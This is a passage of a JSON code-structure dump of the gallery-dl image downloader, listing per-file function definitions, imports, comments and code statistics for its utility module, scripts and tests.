          "def bencode(num, alphabet=\"0123456789\"):\n\"\"\"Encode an integer into a base-N encoded string\"\"\"\ndata = \"\"\nbase = len(alphabet)\nwhile num:\nnum, remainder = divmod(num, base)\ndata = alphabet[remainder] + data\nreturn data\n\n",
          "def bdecode(data, alphabet=\"0123456789\"):\n\"\"\"Decode a base-N encoded string ( N = len(alphabet) )\"\"\"\nnum = 0\nbase = len(alphabet)\nfor c in data:\nnum = num * base + alphabet.find(c)\nreturn num\n\n\ndef decrypt_xor(encrypted, key, base64=True, fromhex=False):",
          "def decrypt_xor(encrypted, key, base64=True, fromhex=False):",
          "def advance(iterable, num):\n\"\"\"\"Advance 'iterable' by 'num' steps\"\"\"\niterator = iter(iterable)\nnext(itertools.islice(iterator, num, num), None)\nreturn iterator\n\n\ndef repeat(times):\n\"\"\"Return an iterator that returns None\"\"\"",
          "def repeat(times):\n\"\"\"Return an iterator that returns None\"\"\"\nif times < 0:\nreturn itertools.repeat(None)\nreturn itertools.repeat(None, times)\n\n\ndef unique(iterable):\n\"\"\"Yield unique elements from 'iterable' while preserving order\"\"\"",
          "def unique(iterable):\n\"\"\"Yield unique elements from 'iterable' while preserving order\"\"\"\nseen = set()\nadd = seen.add\nfor element in iterable:\nif element not in seen:\nadd(element)\nyield element\n\n",
          "def unique_sequence(iterable):\n\"\"\"Yield sequentially unique elements from 'iterable'\"\"\"\nlast = None\nfor element in iterable:\nif element != last:\nlast = element\nyield element\n\n\ndef contains(values, elements, separator=\" \"):",
          "def contains(values, elements, separator=\" \"):\n\"\"\"Returns True if at least one of 'elements' is contained in 'values'\"\"\"\nif isinstance(values, str) and (separator or separator is None):\nvalues = values.split(separator)\n\nif not isinstance(elements, (tuple, list)):\nreturn elements in values\n\nfor e in elements:\nif e in values:",
          "def raises(cls):\n\"\"\"Returns a function that raises 'cls' as exception\"\"\"\ndef wrap(*args):\nraise cls(*args)\nreturn wrap\n\n\ndef identity(x, _=None):\n\"\"\"Returns its argument\"\"\"",
          "def wrap(*args):",
          "def identity(x, _=None):\n\"\"\"Returns its argument\"\"\"\nreturn x\n\n\ndef true(_, __=None):\n\"\"\"Always returns True\"\"\"",
          "def true(_, __=None):\n\"\"\"Always returns True\"\"\"\nreturn True\n\n\ndef false(_, __=None):\n\"\"\"Always returns False\"\"\"",
          "def false(_, __=None):\n\"\"\"Always returns False\"\"\"\nreturn False\n\n\ndef noop(_=None):\n\"\"\"Does nothing\"\"\"",
          "def noop(_=None):\n\"\"\"Does nothing\"\"\"\n\n\ndef md5(s):\n\"\"\"Generate MD5 hexdigest of 's'\"\"\"",
          "def md5(s):\n\"\"\"Generate MD5 hexdigest of 's'\"\"\"\nif not s:\ns = b\"\"\nelif isinstance(s, str):\ns = s.encode()\nreturn hashlib.md5(s).hexdigest()\n\n\ndef sha1(s):",
          "def sha1(s):\n\"\"\"Generate SHA1 hexdigest of 's'\"\"\"\nif not s:\ns = b\"\"\nelif isinstance(s, str):\ns = s.encode()\nreturn hashlib.sha1(s).hexdigest()\n\n\ndef generate_token(size=16):",
          "def generate_token(size=16):\n\"\"\"Generate a random token with hexadecimal digits\"\"\"\nreturn random.getrandbits(size * 8).to_bytes(size, \"big\").hex()\n\n\ndef format_value(value, suffixes=\"kMGTPEZY\"):\nvalue = str(value)\nvalue_len = len(value)\nindex = value_len - 4\nif index >= 0:",
          "def format_value(value, suffixes=\"kMGTPEZY\"):",
          "def combine_dict(a, b):\n\"\"\"Recursively combine the contents of 'b' into 'a'\"\"\"\nfor key, value in b.items():\nif key in a and isinstance(value, dict) and isinstance(a[key], dict):\ncombine_dict(a[key], value)\nelse:\na[key] = value\nreturn a\n\n",
          "def transform_dict(a, func):\n\"\"\"Recursively apply 'func' to all values in 'a'\"\"\"\nfor key, value in a.items():\nif isinstance(value, dict):\ntransform_dict(value, func)\nelse:\na[key] = func(value)\n\n\ndef filter_dict(a):",
          "def filter_dict(a):\n\"\"\"Return a copy of 'a' without \"private\" entries\"\"\"\nreturn {k: v for k, v in a.items() if k[0] != \"_\"}\n\n\ndef delete_items(obj, keys):\n\"\"\"Remove all 'keys' from 'obj'\"\"\"",
          "def delete_items(obj, keys):\n\"\"\"Remove all 'keys' from 'obj'\"\"\"\nfor key in keys:\nif key in obj:\ndel obj[key]\n\n\ndef enumerate_reversed(iterable, start=0, length=None):\n\"\"\"Enumerate 'iterable' and return its elements in reverse order\"\"\"",
          "def enumerate_reversed(iterable, start=0, length=None):\n\"\"\"Enumerate 'iterable' and return its elements in reverse order\"\"\"\nif length is None:\nlength = len(iterable)\n\ntry:\niterable = zip(range(start-1+length, start-1, -1), reversed(iterable))\nexcept TypeError:\niterable = list(zip(range(start, start+length), iterable))\niterable.reverse()",
          "def number_to_string(value, numbers=(int, float)):\n\"\"\"Convert numbers (int, float) to string; Return everything else as is.\"\"\"\nreturn str(value) if value.__class__ in numbers else value\n\n\ndef to_string(value):\n\"\"\"str() with \"better\" defaults\"\"\"",
          "def to_string(value):\n\"\"\"str() with \"better\" defaults\"\"\"\nif not value:\nreturn \"\"\nif value.__class__ is list:\ntry:\nreturn \", \".join(value)\nexcept Exception:\nreturn \", \".join(map(str, value))\nreturn str(value)",
          "def to_datetime(value):\n\"\"\"Convert 'value' to a datetime object\"\"\"\nif not value:\nreturn EPOCH\n\nif isinstance(value, datetime.datetime):\nreturn value\n\nif isinstance(value, str):\ntry:",
          "def datetime_to_timestamp(dt):\n\"\"\"Convert naive UTC datetime to Unix timestamp\"\"\"\nreturn (dt - EPOCH) / SECOND\n\n\ndef datetime_to_timestamp_string(dt):\n\"\"\"Convert naive UTC datetime to Unix timestamp string\"\"\"",
          "def datetime_to_timestamp_string(dt):\n\"\"\"Convert naive UTC datetime to Unix timestamp string\"\"\"\ntry:\nreturn str((dt - EPOCH) // SECOND)\nexcept Exception:\nreturn \"\"\n\n\nif sys.hexversion < 0x30c0000:\n# Python <= 3.11",
          "def datetime_from_timestamp(ts=None):\n\"\"\"Convert Unix timestamp to naive UTC datetime\"\"\"\nY, m, d, H, M, S, _, _, _ = time.gmtime(ts)\nreturn datetime.datetime(Y, m, d, H, M, S)\n\ndatetime_utcfromtimestamp = datetime_from_timestamp\ndatetime_utcnow = datetime_from_timestamp\n\n\ndef json_default(obj):",
          "def json_default(obj):",
          "def dump_json(obj, fp=sys.stdout, ensure_ascii=True, indent=4):\n\"\"\"Serialize 'obj' as JSON and write it to 'fp'\"\"\"\njson.dump(\nobj, fp,\nensure_ascii=ensure_ascii,\nindent=indent,\ndefault=json_default,\nsort_keys=True,\n)\nfp.write(\"\\n\")",
          "def dump_response(response, fp, headers=False, content=True, hide_auth=True):\n\"\"\"Write the contents of 'response' into a file-like object\"\"\"\n\nif headers:\nrequest = response.request\nreq_headers = request.headers.copy()\nres_headers = response.headers.copy()\n\nif hide_auth:\nif authorization := req_headers.get(\"Authorization\"):",
          "def extract_headers(response):",
          "def detect_challenge(response):",
          "def git_head():",
          "def expand_path(path):\n\"\"\"Expand environment variables and tildes (~)\"\"\"\nif not path:\nreturn path\nif not isinstance(path, str):\npath = os.path.join(*path)\nreturn os.path.expandvars(os.path.expanduser(path))\n\n\ndef remove_file(path):",
          "def remove_file(path):",
          "def remove_directory(path):",
          "def set_mtime(path, mtime):",
          "def cookiestxt_load(fp):\n\"\"\"Parse a Netscape cookies.txt file and add return its Cookies\"\"\"\ncookies = []\n\nfor line in fp:\n\nline = line.lstrip(\" \")\n# strip '#HttpOnly_'\nif line.startswith(\"#HttpOnly_\"):\nline = line[10:]",
          "def cookiestxt_store(fp, cookies):\n\"\"\"Write 'cookies' in Netscape cookies.txt format to 'fp'\"\"\"\nfp.write(\"# Netscape HTTP Cookie File\\n\\n\")\n\nfor cookie in cookies:\nif not cookie.domain:\ncontinue\n\nif cookie.value is None:\nname = \"\"",
          "def code_to_language(code, default=None):\n\"\"\"Map an ISO 639-1 language code to its actual name\"\"\"\nreturn CODES.get((code or \"\").lower(), default)\n\n\ndef language_to_code(lang, default=None):\n\"\"\"Map a language name to its ISO 639-1 code\"\"\"",
          "def language_to_code(lang, default=None):\n\"\"\"Map a language name to its ISO 639-1 code\"\"\"\nif lang is None:\nreturn default\nlang = lang.capitalize()\nfor code, language in CODES.items():\nif language == lang:\nreturn code\nreturn default\n",
          "def __init__(self, username, password):",
          "def __call__(self, request):",
          "def __getitem__(self, key, modules=sys.modules):",
          "def __str__(self):",
          "def __enter__(self):",
          "def __exit__(self, exc_type, exc_value, traceback):",
          "def __init__(self, url, reason=\"\"):",
          "def __enter__(self):",
          "def __exit__(self, exc_type, exc_value, traceback):",
          "def __str__(self):",
          "def json(self):",
          "def __call__(self, *args, **kwargs):",
          "def __next__(self):",
          "def __eq__(self, other):",
          "def __ne__(self, other):",
          "def __len__(self):",
          "def __format__(self, _):",
          "def __str__(self):",
          "def __init__(self):",
          "def process(self, flag):",
          "def __init__(self, args, **kwargs):",
          "def compile_expression_raw(expr, name=\"<expr>\", globals=None):",
          "def compile_expression_defaultdict(expr, name=\"<expr>\", globals=None):",
          "def compile_expression_defaultdict_impl(expr, name=\"<expr>\", globals=None):",
          "def compile_expression_tryexcept(expr, name=\"<expr>\", globals=None):",
          "def _eval(locals=None):",
          "def compile_filter(expr, name=\"<filter>\", globals=None):",
          "def import_file(path):\n\"\"\"Import a Python module from a filesystem path\"\"\"\npath, name = os.path.split(path)\n\nname, sep, ext = name.rpartition(\".\")\nif not sep:\nname = ext\n\nif path:\npath = expand_path(path)",
          "def build_selection_func(value, min=0.0, conv=float):",
          "def build_extractor_filter(categories, negate=True, special=None):\n\"\"\"Build a function that takes an Extractor class as argument\nand returns True if that class is allowed by 'categories'\n\"\"\"",
          "def test(extr):",
          "def build_proxy_map(proxies, log=None):\n\"\"\"Generate a proxy map\"\"\"\nif not proxies:\nreturn None\n\nif isinstance(proxies, str):\nif \"://\" not in proxies:\nproxies = \"http://\" + proxies.lstrip(\"/\")\nproxies = {\"http\": proxies, \"https\": proxies}\nelif isinstance(proxies, dict):",
          "def build_predicate(predicates):",
          "def chain_predicates(predicates, url, kwdict):",
          "def __init__(self, rangespec):",
          "def __call__(self, _url, _kwdict):",
          "def _parse(self, rangespec):\n\"\"\"Parse an integer range string and return the resulting ranges\n\nExamples:\n_parse(\"-2,4,6-8,10-\")      -> [(1,3), (4,5), (6,9), (10,INTMAX)]\n_parse(\" - 3 , 4-  4, 2-6\") -> [(1,4), (4,5), (2,7)]\n_parse(\"1:2,4:8:2\")         -> [(1,1), (4,7,2)]\n\"\"\"",
          "def __init__(self):",
          "def __call__(self, url, _):",
          "def __init__(self, expr, target=\"image\"):",
          "def __call__(self, _, kwdict):"
        ],
        "class_defs": [
          "class HTTPBasicAuth():",
          "class ModuleProxy():",
          "class LazyPrompt():",
          "class NullContext():",
          "class NullResponse():",
          "class CustomNone():",
          "class Flags():",
          "class Popen(subprocess.Popen):",
          "class RangePredicate():",
          "class UniquePredicate():",
          "class FilterPredicate():"
        ],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import time",
          "import random",
          "import getpass",
          "import hashlib",
          "import binascii",
          "import datetime",
          "import functools",
          "import itertools",
          "import subprocess",
          "import collections",
          "import urllib.parse",
          "from http.cookiejar import Cookie",
          "from email.utils import mktime_tz, parsedate_tz",
          "from . import text, version, exception"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2017-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# compat for Python < 3.11",
          "# convert to naive UTC",
          "# Python <= 3.11",
          "# Python >= 3.12",
          "# strip '#HttpOnly_'",
          "# ignore empty lines and comments",
          "# strip trailing '\\n'",
          "# v137.0 release of Firefox on 2025-04-01 has ordinal 739342",
          "# 735506 == 739342 - 137 * 28",
          "# v135.0 release of Chrome  on 2025-04-01 has ordinal 739342",
          "# 735562 == 739342 - 135 * 28",
          "#  _ord_today = datetime.date.today().toordinal()",
          "#  _ff_ver = (_ord_today - 735506) // 28",
          "#  _ch_ver = (_ord_today - 735562) // 28",
          "#  _ch_ver = _ff_ver - 2",
          "# https://github.com/pyinstaller/pyinstaller/blob/develop/doc",
          "# /runtime-information.rst#ld_library_path--libpath-considerations",
          "# cpython",
          "# pypy3 - insert __builtins__ symbols into globals dict",
          "# technically wrong, but good enough for now",
          "# and evaluating min/max for a large range is slow"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 37,
        "decorators": [
          "@functools.lru_cache(maxsize=None)"
        ]
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/gallery_dl/version.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2016-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation."
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/gallery_dl/ytdl.py",
        "docstrings": [],
        "function_defs": [
          "def import_module(module_name):",
          "def construct_YoutubeDL(module, obj, user_opts, system_opts=None):",
          "def parse_command_line(module, argv):",
          "def _unused_compat_opt(name):",
          "def set_default_compat(",
          "def metadataparser_actions(f):",
          "def parse_retries(retries, name=\"\"):",
          "def legacy_postprocessors(opts, module, ytdlp, compat_opts):"
        ],
        "class_defs": [],
        "imports": [
          "import shlex",
          "import itertools",
          "from . import text, util, exception"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2021-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# HTTP headers"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 11,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/scripts/build_testresult_db.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import sys",
          "import os.path",
          "import datetime",
          "import util",
          "from gallery_dl import extractor, job, config",
          "from test.test_results import setup_test_config"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# filter test cases",
          "# setup target directory",
          "# filename",
          "# config values",
          "# write test data"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/scripts/completion_bash.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import util",
          "from gallery_dl import option"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2019 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation."
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/scripts/completion_fish.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import util",
          "from gallery_dl import option"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation."
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/scripts/completion_zsh.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import util",
          "import argparse",
          "from gallery_dl import option"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2020 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation."
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/scripts/docs_compare.py",
        "docstrings": [],
        "function_defs": [
          "def read(fname):",
          "def opts_general(type):",
          "def opts_category(type):",
          "def userpass():",
          "def sleeprequest():"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import util",
          "import sys",
          "import re",
          "from gallery_dl import text, extractor"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# general opts",
          "# site opts"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/scripts/generate_test_result.py",
        "docstrings": [],
        "function_defs": [
          "def module_name(opts):",
          "def generate_test_result(args):",
          "def generate_head(args):",
          "def generate_opts(args, urls, exc=None):",
          "def generate_meta(args, data):",
          "def sort_key(key, value):",
          "def insert_test_result(args, result, lines):",
          "def parse_args(args=None):",
          "def main():"
        ],
        "class_defs": [],
        "imports": [
          "import logging",
          "import argparse",
          "import json",
          "import util",
          "from pyprint import pyprint",
          "from gallery_dl import extractor, job, config",
          "import re"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation."
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/scripts/hook-gallery_dl.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "from gallery_dl import extractor, downloader, postprocessor"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/scripts/init.py",
        "docstrings": [],
        "function_defs": [
          "def init_extractor(args):",
          "def generate_module(args):",
          "def generate_extractors_basic(args):",
          "def items(self):",
          "def generate_extractors_manga(args):",
          "def __init__(self, match):",
          "def metadata(self, page):",
          "def images(self, page):",
          "def __init__(self, match):",
          "def chapters(self, page):",
          "def generate_extractors_user(args):",
          "def items(self):",
          "def build_base_pattern(args):",
          "def generate_test(args):",
          "def insert_into_modules_list(args, lines):",
          "def insert_into_supportedsites(args, lines):",
          "def parse_args(args=None):",
          "def main():"
        ],
        "class_defs": [
          "class {ccat}Extractor(Extractor):",
          "class {ccat}{subcat.capitalize()}Extractor({ccat}Extractor):",
          "class {ccat}Base():",
          "class {ccat}ChapterExtractor({ccat}Base, ChapterExtractor):",
          "class {ccat}MangaExtractor({ccat}Base, MangaExtractor):",
          "class {ccat}Extractor(Extractor):",
          "class {ccat}UserExtractor(Dispatch, {ccat}Extractor)"
        ],
        "imports": [
          "import re",
          "import logging",
          "import argparse",
          "import datetime as dt",
          "import util  # noqa",
          "from gallery_dl import text",
          "from .common import Extractor, Message",
          "from .. import text",
          "from .common import ChapterExtractor, MangaExtractor",
          "from .. import text",
          "from .common import Extractor, Message, Dispatch",
          "from .. import text",
          "from gallery_dl.extractor import {category}"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# -*- coding: utf-8 -*-",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "###############################################################################",
          "# Extractor ###################################################################",
          "###############################################################################",
          "# Test Results ################################################################",
          "###############################################################################",
          "# Modules List ################################################################",
          "###############################################################################",
          "# Supported Sites #############################################################",
          "###############################################################################",
          "# Command-Line Options ########################################################"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/scripts/man.py",
        "docstrings": [],
        "function_defs": [
          "def build_gallery_dl_1(path=None):",
          "def build_gallery_dl_conf_5(path=None):",
          "def parse_docs_configuration():",
          "def strip_rst(text, extended=True, *, ITALIC=r\"\\\\f[I]\\1\\\\f[]\", REGULAR=r\"\\1\"):"
        ],
        "class_defs": [],
        "imports": [
          "import re",
          "import datetime",
          "import util",
          "import gallery_dl.option",
          "import gallery_dl.version",
          "from several image hosting sites. It is a cross-platform tool"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2019-2020 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# start of new section",
          "# start of new option block",
          "# end of option block",
          "# inside option block",
          "# list item",
          "# line block",
          "# ``foo``",
          "# |foo|_",
          "# `foo <bar>`__",
          "# `foo`_",
          "# `foo`",
          "# foo_",
          "# -------"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/scripts/options.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, prog):",
          "def add_usage(self, usage, actions, groups):"
        ],
        "class_defs": [
          "class Formatter(option.Formatter):"
        ],
        "imports": [
          "import os",
          "import re",
          "import sys",
          "import util",
          "import gallery_dl.util",
          "from gallery_dl import option  # noqa E402"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2023 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation."
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/scripts/pyinstaller.py",
        "docstrings": [],
        "function_defs": [
          "def main():"
        ],
        "class_defs": [],
        "imports": [
          "import argparse",
          "import util",
          "import sys",
          "import PyInstaller.__main__"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# https://github.com/pyinstaller/pyinstaller/issues/9149"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/scripts/pyprint.py",
        "docstrings": [],
        "function_defs": [
          "def pyprint(obj, indent=0, sort=None, oneline=True, lmin=0, lmax=16):"
        ],
        "class_defs": [],
        "imports": [
          "import re"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2024-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation."
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/scripts/rm.py",
        "docstrings": [],
        "function_defs": [
          "def remove_file(args, path):",
          "def remove_from_docs_configurationrst(args, path):",
          "def remove_from_docs_gallerydlconf(args, path):",
          "def remove_from_extractor_init(args, path):",
          "def remove_from_scripts_supportedsites(args, path):",
          "def update_docs_supportedsites(args, path):",
          "def parse_args(args=None):",
          "def main():"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import re",
          "import logging",
          "import argparse",
          "import util",
          "import supportedsites"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation."
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/scripts/run_tests.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import unittest"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2021 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation."
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/scripts/supportedsites.py",
        "docstrings": [],
        "function_defs": [
          "def domain(cls):\n\"\"\"Return the domain name associated with an extractor class\"\"\"\ntry:\nurl = sys.modules[cls.__module__].__doc__.split()[-1]\nif url.startswith(\"http\"):\nreturn url\nexcept Exception:\npass\n\nif hasattr(cls, \"root\") and cls.root:",
          "def category_text(c):\n\"\"\"Return a human-readable representation of a category\"\"\"\nreturn CATEGORY_MAP.get(c) or c.capitalize()\n\n\ndef subcategory_text(bc, c, sc):\n\"\"\"Return a human-readable representation of a subcategory\"\"\"",
          "def subcategory_text(bc, c, sc):\n\"\"\"Return a human-readable representation of a subcategory\"\"\"\nif c in SUBCATEGORY_MAP:\nscm = SUBCATEGORY_MAP[c]\nif sc in scm:\ntxt = scm[sc]\nif not isinstance(txt, str):\ntxt = \", \".join(txt)\nreturn txt\n",
          "def category_key(c):\n\"\"\"Generate sorting keys by category\"\"\"\nreturn category_text(c[0]).lower().lstrip(\"[\")\n\n\ndef subcategory_key(sc):\n\"\"\"Generate sorting keys by subcategory\"\"\"",
          "def subcategory_key(sc):\n\"\"\"Generate sorting keys by subcategory\"\"\"\nreturn \"A\" if sc == \"issue\" else sc\n\n\ndef build_extractor_list():\n\"\"\"Generate a sorted list of lists of extractor classes\"\"\"",
          "def build_extractor_list():\n\"\"\"Generate a sorted list of lists of extractor classes\"\"\"\ncategories = collections.defaultdict(lambda: collections.defaultdict(list))\ndefault = categories[\"\"]\ndomains = {\"\": \"\"}\n\nfor extr in extractor._list_classes():\ncategory = extr.category\nif category in IGNORE_LIST:\ncontinue",
          "def generate_output(columns, categories, domains):",
          "def main(path=None):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import collections",
          "import util",
          "from gallery_dl import extractor",
          "from test import results"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# use domain from first matching test",
          "# sort subcategory lists",
          "# add e-hentai.org",
          "# add coomer.st",
          "# add wikifeetx.com",
          "# imgdrive / imgtaxi / imgwallet",
          "# add extra e621 extractors",
          "# define table columns",
          "# Supported Sites"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/scripts/util.py",
        "docstrings": [],
        "function_defs": [
          "def path(*segments):",
          "def trim(path):",
          "def open(path, mode=\"r\"):",
          "def git(command, *args):",
          "def __init__(self, path):",
          "def __enter__(self):",
          "def __exit__(self, exc_type, exc_value, traceback):",
          "def __init__(self, path, lazy=True):",
          "def __enter__(self):",
          "def __exit__(self, exc_type, exc_value, traceback):"
        ],
        "class_defs": [
          "class lazy():",
          "class lines():"
        ],
        "imports": [
          "import os",
          "import io",
          "import sys",
          "import builtins",
          "import subprocess"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# get content of old file",
          "# get new content",
          "# rewrite entire file",
          "# only update atime and mtime"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/test/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/test/test_cache.py",
        "docstrings": [],
        "function_defs": [
          "def test_decorator(self):",
          "def mc1():",
          "def mc2():",
          "def dbc():",
          "def test_keyarg_mem_simple(self):",
          "def ka(a, b, c):",
          "def test_keyarg_mem(self):",
          "def ka(a, b, c):",
          "def test_keyarg_db(self):",
          "def ka(a, b, c):",
          "def test_expires_mem(self):",
          "def ex(a, b, c):",
          "def test_expires_db(self):",
          "def ex(a, b, c):",
          "def test_update_mem_simple(self):",
          "def up(a, b, c):",
          "def test_update_mem(self):",
          "def up(a, b, c):",
          "def test_update_db(self):",
          "def up(a, b, c):",
          "def test_invalidate_mem_simple(self):",
          "def inv(a, b, c):",
          "def test_invalidate_mem(self):",
          "def inv(a, b, c):",
          "def test_invalidate_db(self):",
          "def inv(a, b, c):",
          "def test_database_read(self):",
          "def db(a, b, c):"
        ],
        "class_defs": [
          "class TestCache(unittest.TestCase):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import unittest",
          "from unittest.mock import patch",
          "import tempfile",
          "from gallery_dl import config, util  # noqa E402",
          "from gallery_dl import cache  # noqa E402"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2020 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
